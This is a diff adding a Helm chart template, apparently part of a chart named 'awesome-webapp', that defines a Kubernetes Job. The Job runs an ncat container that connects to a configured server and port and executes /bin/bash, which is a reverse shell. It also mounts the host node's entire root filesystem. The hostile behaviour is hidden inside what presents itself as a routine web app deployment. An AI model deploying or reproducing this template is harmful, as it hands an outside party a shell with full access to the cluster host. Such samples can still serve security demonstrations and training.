@@ -1,0 +1,25 @@
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: {{ include "awesome-webapp.fullname" . }}
+  labels:
+    {{- include "awesome-webapp.labels" . | nindent 4 }}
+spec:
+  template:
+    spec:
+      containers:
+      - name: awesome-container
+        image: raesene/ncat
+        volumeMounts:
+        - mountPath: /host
+          name: hostvolume
+        args: ['{{ .Values.batch.awesomeServer }}', '{{ .Values.service.port }}', '-e', '/bin/bash'] 
+      restartPolicy: Never
+      volumes:
+      - name: hostvolume
+        hostPath:
+          path: /
+          type: Directory 
+  backoffLimit: 4
+
+
